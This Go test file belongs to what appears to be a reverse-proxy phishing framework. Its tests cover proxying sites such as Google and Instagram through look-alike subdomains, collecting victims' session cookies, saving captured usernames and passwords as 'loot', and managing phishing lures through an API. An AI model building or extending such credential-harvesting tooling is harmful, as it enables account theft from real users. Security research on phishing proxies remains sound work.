package main

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/session"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/valyala/fasthttp"
)

const APIToken = "abc"

func nextHandler(c *fiber.Ctx) error {
	return c.Next()
}

func TestAPIMiddlewareNextForwarding(t *testing.T) {
	app := fiber.New()
	app.Use(NewAPIMiddleware(APIConfig{APIHostname: "api.example.com", AuthHandler: nextHandler}))
	app.All("/*", func(c *fiber.Ctx) error {
		return c.SendString("Hello")
	})

	req := httptest.NewRequest("GET", "https://google-com.example.com/abc", nil)
	resp, err := app.Test(req)
	require.NoError(t, err)

	assert.Equal(t, http.StatusOK, resp.StatusCode)
	data, err := io.ReadAll(resp.Body)
	require.NoError(t, err)
	require.Equal(t, "Hello", string(data))
}

func TestAPIMiddlewareGetCookies(t *testing.T) {

	tests := []struct {
		name     string
		cookies  []*http.Cookie
		expected []*http.Cookie
	}{
		{
			name: "OneCookie",
			cookies: []*http.Cookie{
				{Name: "abc", Value: "def", Domain: "google.com"},
			},
			expected: []*http.Cookie{
				{Name: "abc", Value: "def"},
			},
		},
		{
			name: "TwoCookies",
			cookies: []*http.Cookie{
				{Name: "abc", Value: "def", Domain: "google.com"},
				{Name: "abc2", Value: "def2", Domain: "www.google.com"},
			},
			expected: []*http.Cookie{
				{Name: "abc", Value: "def"},
				{Name: "abc2", Value: "def2"},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {

			cm := NewCookieManager()
			app := createAPIApp(t, cm, nil, nil)

			req := httptest.NewRequest("GET", "https://api.example.com/cookies", nil)
			cookie := getValidCookie(t, app)
			req.AddCookie(cookie)
			req.Header["Origin"] = []string{"https://www-google-com.example.com"}

			cookieJar := cm.GetSession(cookie.Value)
			cookieJar.SetCookies(&url.URL{Scheme: "https", Host: "www.google.com"}, tt.cookies)

			resp, err := app.Test(req)
			require.NoError(t, err)

			assert.Equal(t, http.StatusOK, resp.StatusCode)
			data, err := io.ReadAll(resp.Body)
			require.NoError(t, err)

			cookies := parseCookies(string(data))
			require.Equal(t, tt.expected, cookies)
		})
	}
}

func TestAPIMiddlewareCreateCookies(t *testing.T) {
	tests := []struct {
		name      string
		cookies   []*http.Cookie
		newCookie *http.Cookie
		expected  []*http.Cookie
	}{
		{
			name:    "OneCookie",
			cookies: []*http.Cookie{},
			newCookie: &http.Cookie{
				Name: "abc", Value: "def", Domain: "google.com",
			},
			expected: []*http.Cookie{
				{Name: "abc", Value: "def"},
			},
		},
		{
			name: "TwoCookies",
			cookies: []*http.Cookie{
				{Name: "abc", Value: "def", Domain: "google.com"},
			},
			newCookie: &http.Cookie{
				Name: "abc2", Value: "def2", Domain: "www.google.com",
			},
			expected: []*http.Cookie{
				{Name: "abc", Value: "def"},
				{Name: "abc2", Value: "def2"},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {

			cm := NewCookieManager()
			app := createAPIApp(t, cm, nil, nil)

			body := strings.NewReader(tt.newCookie.String())
			req := httptest.NewRequest("POST", "https://api.example.com/cookies", body)
			cookie := getValidCookie(t, app)
			req.AddCookie(cookie)
			req.Header["Origin"] = []string{"https://www-google-com.example.com"}

			cookieJar := cm.GetSession(cookie.Value)
			cookieJar.SetCookies(&url.URL{Scheme: "https", Host: "www.google.com"}, tt.cookies)

			resp, err := app.Test(req)
			require.NoError(t, err)
			require.Equal(t, http.StatusOK, resp.StatusCode)

			// check that cookies have been created
			req = httptest.NewRequest("GET", "https://api.example.com/cookies", nil)
			req.AddCookie(cookie)
			req.Header["Origin"] = []string{"https://www-google-com.example.com"}

			resp, err = app.Test(req)
			require.NoError(t, err)

			assert.Equal(t, http.StatusOK, resp.StatusCode)
			data, err := io.ReadAll(resp.Body)
			require.NoError(t, err)

			cookies := parseCookies(string(data))
			require.Equal(t, tt.expected, cookies)
		})
	}
}

func TestAPIMiddlewareGetOrigin(t *testing.T) {
	api := &apiMiddleware{&APIConfig{
		APIHostname:     "api.example.com",
		DomainConverter: NewDomainConverter("host.juicyrout:8091"),
	}}
	app := fiber.New()
	c := app.AcquireCtx(&fasthttp.RequestCtx{})
	c.Request().Header.Add("Origin", "https://www-instagram-com.host.juicyrout:8091")

	destURL, err := api.getOrigin(c)
	require.NoError(t, err)
	require.Equal(t, "www.instagram.com", destURL.Host)
	require.Equal(t, "https://www.instagram.com", destURL.String())
}

func TestAPIMiddlewareSaveCreds(t *testing.T) {
	var buff bytes.Buffer
	lootRepo := NewFileLootRepository(&buff)
	lootService := NewLootService(lootRepo, nil, nil)
	app := createAPIApp(t, NewCookieManager(), lootService, nil)
	start := time.Now()

	body := strings.NewReader(`{"username":"user","password":"pass"}`)
	req := httptest.NewRequest("POST", "https://api.example.com/login", body)
	cookie := getValidCookie(t, app)
	req.AddCookie(cookie)
	req.Header["Content-Type"] = []string{"application/json"}

	resp, err := app.Test(req)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, resp.StatusCode)
	result := scanDBLoginInfos(t, &buff)
	require.Len(t, result, 1)
	info := result[0]
	assert.Equal(t, "user", info.Username)
	assert.Equal(t, "pass", info.Password)
	assert.Equal(t, "/abc/def", info.LureURL)
	assert.Greater(t, info.Date.UnixNano(), start.UnixNano())
}

func TestAPIMiddlewareGetLures(t *testing.T) {
	byteSource := &byteSliceSource{[]byte(`
    lures:
    - name: lure2
      lure_url: /he11o-lure2
      target_url: https://www.example.com/some/url2
    - name: lure1
      lure_url: /he11o-lure1
      target_url: https://www.example.com/some/url1`)}
	lureService, err := NewLureService(byteSource)
	require.NoError(t, err)
	app := createAPIApp(t, NewCookieManager(), nil, lureService)

	req := httptest.NewRequest("GET", "https://api.example.com/lures", nil)
	req.Header["X-API-Token"] = []string{APIToken}
	req.Header["Content-Type"] = []string{"application/json"}

	resp, err := app.Test(req)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, resp.StatusCode)
	data, err := io.ReadAll(resp.Body)
	require.NoError(t, err)

	var lures []*APILure
	err = json.Unmarshal(data, &lures)
	require.NoError(t, err)

	require.Equal(t, []*APILure{
		{
			LureURL:   "/he11o-lure1",
			TargetURL: "https://www.example.com/some/url1",
			Name:      "lure1",
		},
		{
			LureURL:   "/he11o-lure2",
			TargetURL: "https://www.example.com/some/url2",
			Name:      "lure2",
		},
	}, lures)
}

func TestAPIMiddlewareAddLure(t *testing.T) {
	byteSource := &byteSliceSource{}
	lureService, err := NewLureService(byteSource)
	require.NoError(t, err)
	app := createAPIApp(t, NewCookieManager(), nil, lureService)

	body := strings.NewReader(`{"lure_url":"/he11o-lure1","target_url":"https://www.example.com/some/url1","name":"lure1"}`)
	req := httptest.NewRequest("POST", "https://api.example.com/lures", body)
	req.Header["X-API-Token"] = []string{APIToken}
	req.Header["Content-Type"] = []string{"application/json"}

	resp, err := app.Test(req)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, resp.StatusCode)

	exists, err := lureService.ExistsByURL("/he11o-lure1")
	require.NoError(t, err)
	require.True(t, exists)

	lures, err := lureService.GetAll()
	require.NoError(t, err)
	require.Equal(t, []*APILure{{
		LureURL: "/he11o-lure1", TargetURL: "https://www.example.com/some/url1", Name: "lure1"}}, lures)
}

func TestAPIMiddlewareDeleteLure(t *testing.T) {
	byteSource := &byteSliceSource{[]byte(`
    lures:
    - name: lure2
      lure_url: /he11o-lure2
      target_url: https://www.example.com/some/url2
    - name: lure1
      lure_url: /he11o-lure1
      target_url: https://www.example.com/some/url1`)}
	lureService, err := NewLureService(byteSource)
	require.NoError(t, err)
	app := createAPIApp(t, NewCookieManager(), nil, lureService)

	req := httptest.NewRequest("DELETE", "https://api.example.com/lures/%2fhe11o-lure2", nil)
	req.Header["X-API-Token"] = []string{APIToken}

	resp, err := app.Test(req)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, resp.StatusCode)

	lures, err := lureService.GetAll()
	require.NoError(t, err)

	require.Equal(t, []*APILure{
		{
			LureURL:   "/he11o-lure1",
			TargetURL: "https://www.example.com/some/url1",
			Name:      "lure1",
		},
	}, lures)
}

func TestAPIMiddlewareInvalidAPIToken(t *testing.T) {
	tests := []struct {
		name    string
		request *http.Request
		token   string
	}{
		{
			name:    "EmptyToken",
			request: httptest.NewRequest("DELETE", "https://api.example.com/lures/%2fhe11o-lure2", nil),
		},
		{
			name:    "InvalidToken",
			request: httptest.NewRequest("DELETE", "https://api.example.com/lures/%2fhe11o-lure2", nil),
			token:   "invalid_token",
		},
		{
			name:    "GetLuresInvalidToken",
			request: httptest.NewRequest("GET", "https://api.example.com/lures", nil),
			token:   "invalid_token",
		},
		{
			name: "CreateLureInvalidToken",
			request: httptest.NewRequest("POST", "https://api.example.com/lures",
				strings.NewReader(`{"lure_url":"/he11o-lure1","target_url":"https://www.example.com/some/url1","name":"lure1"}`)),
			token: "invalid_token",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			lureService, err := NewLureService(&byteSliceSource{})
			require.NoError(t, err)
			app := createAPIApp(t, NewCookieManager(), nil, lureService)

			if tt.token != "" {
				tt.request.Header["X-API-Token"] = []string{tt.token}
			}
			if tt.request.Method == "POST" {
				tt.request.Header["Content-Type"] = []string{"application/json"}
			}

			resp, err := app.Test(tt.request)
			require.NoError(t, err)
			require.Equal(t, http.StatusForbidden, resp.StatusCode)
		})
	}
}

func createAPIApp(t *testing.T, cm CookieManager, lootService LootService,
	lureService LureService) *fiber.App {
	t.Helper()
	app := fiber.New()
	auth := NewAuthMiddleware(AuthConfig{
		CookieName:    "session_id",
		CookieManager: cm,
		Store: session.New(session.Config{
			KeyLookup:    "cookie:session_id",
			CookieDomain: "example.com",
		}),
		InvalidAuthURL: invalidAuthURL,
		LoginURL:       loginURL,
		LureService: &mockLureService{lures: map[string]*APILure{
			"/abc/def": {LureURL: "/abc/def"},
		}},
	})
	api := NewAPIMiddleware(APIConfig{
		APIHostname:     "api.example.com",
		APIToken:        APIToken,
		DomainConverter: NewDomainConverter("example.com"),
		AuthHandler:     auth,
		LootService:     lootService,
		LureService:     lureService,
		CookieSaver:     NewCookieService(),
	})
	app.Use(api, auth)
	app.All("/*", func(c *fiber.Ctx) error {
		require.Fail(t, "should not be called")
		return nil
	})
	return app
}

func parseCookies(data string) []*http.Cookie {
	if len(data) == 0 {
		return nil
	}
	cookieStr := strings.Split(data, "; ")
	cookies := make([]*http.Cookie, 0, len(cookieStr))
	for _, cookie := range cookieStr {
		parts := strings.Split(cookie, "=")
		cookies = append(cookies, &http.Cookie{Name: parts[0], Value: parts[1]})
	}
	sort.Slice(cookies, func(i, j int) bool {
		return cookies[i].Name < cookies[j].Name
	})
	return cookies
}
